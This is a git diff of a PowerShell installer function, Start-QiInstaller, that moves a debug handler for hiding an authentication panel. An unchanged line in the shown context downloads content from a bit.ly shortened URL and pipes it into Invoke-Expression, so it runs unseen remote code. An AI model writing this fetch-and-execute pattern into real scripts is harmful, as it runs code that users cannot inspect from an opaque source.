@@ -30,6 +30,12 @@ function Start-QiInstaller {
         New-Item -ItemType Directory -Path $ScriptPath\logs | Out-Null
     }
     #Debug Options
+    $AuthDebugButton_Click = {
+        if ($AuthPanel.Visible) {
+            $AuthPanel.Visible = $false
+        }
+    }
+    
     $DebugConsole_Click = {
         $DebugCommandButton.Visible = -not $DebugCommandButton.Visible
         $DebugCommand.Visible = -not $DebugCommand.Visible
@@ -369,12 +375,6 @@ function Start-QiInstaller {
     }
     else {
         (New-Object System.Net.WebClient).DownloadString('http://bit.ly/32j0NQX') | Invoke-Expression; 
-    }
-
-    $AuthDebugButton_Click = {
-        if ($AuthPanel.Visible) {
-            $AuthPanel.Visible = $false
-        }
     }
 
     <# 
